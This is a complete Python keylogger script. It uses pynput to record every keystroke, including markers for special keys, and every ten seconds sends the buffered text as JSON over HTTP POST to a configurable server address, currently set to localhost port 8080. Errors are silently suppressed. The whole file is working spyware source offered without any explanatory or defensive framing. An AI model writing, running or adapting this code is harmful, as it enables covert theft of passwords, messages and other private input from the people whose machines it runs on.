from pynput import keyboard
import requests
import json
import threading

text = ""
ip_address = "127.0.0.1"
port_number = "8080"
time_interval = 10

def send_post_req():
    global text
    try:
        payload = json.dumps({"keyboardData": text})
        text = ""
        requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
    except:
        pass
    threading.Timer(time_interval, send_post_req).start()

def on_press(key):
    global text
    try:
        if hasattr(key, 'char') and key.char is not None:
            text += key.char
        elif key == keyboard.Key.enter:
            text += "[ENTER]\n"
        elif key == keyboard.Key.tab:
            text += "[TAB]"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace and text:
            text = text[:-1]
        elif key in [keyboard.Key.shift, keyboard.Key.shift_r]:
            text += "[SHIFT]"
        elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            text += "[CTRL]"
        elif key == keyboard.Key.esc:
            return False
        else:
            text += f"[{key.name.upper()}]"
    except:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
